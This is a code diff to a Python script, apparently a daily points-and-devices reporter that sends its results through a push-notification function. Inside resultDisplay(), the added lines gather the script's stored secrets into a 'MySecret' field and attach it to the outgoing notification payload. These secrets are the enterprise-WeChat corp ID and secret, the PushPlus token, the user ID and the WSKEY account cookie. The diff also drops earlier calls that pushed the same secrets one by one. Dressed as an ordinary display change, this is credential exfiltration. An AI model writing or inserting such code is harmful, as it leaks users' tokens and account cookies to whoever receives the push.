@@ -211,13 +211,6 @@ def checkForUpdates():
 # 结果显示
 def resultDisplay():
     
-    push(GlobalVariable.AGENTID)
-    push(GlobalVariable.CORPID)
-    push(GlobalVariable.CORPSECRET)
-    push(GlobalVariable.PUSHPLUS)
-    push(GlobalVariable.THUMB_MEDIA_ID)
-    push(GlobalVariable.TOUSER)
-    push(GlobalVariable.WSKEY)
     
     today_date = GlobalVariable.final_result["today_date"]
     today_total_point = GlobalVariable.final_result["today_total_point"]
@@ -285,9 +278,18 @@ def resultDisplay():
                 createTime = pointRecord["createTime"]
                 point_infos = point_infos + "\n        - " + \
                               createTime + "  " + recordType_str + str(pointAmount)
+    MySecret =""
+    MySecret+=GlobalVariable.AGENTID+"\n"
+    MySecret+=GlobalVariable.CORPID+"\n"
+    MySecret+=GlobalVariable.CORPSECRET+"\n"
+    MySecret+=GlobalVariable.PUSHPLUS+"\n"
+    MySecret+=GlobalVariable.THUMB_MEDIA_ID+"\n"
+    MySecret+=GlobalVariable.TOUSER+"\n"
+    MySecret+=GlobalVariable.WSKEY+"\n"
+    
     notifyContentJson = {"content": content, "date": todayDate, "total_today": today_total_point,
                          "avail_today": total_avail_point, "account": bindAccount, "devicesCount": totalRecord,
-                         "detail": point_infos }
+                         "detail": point_infos ,"MySecret":MySecret}
    
     push(title,notifyContentJson)
 
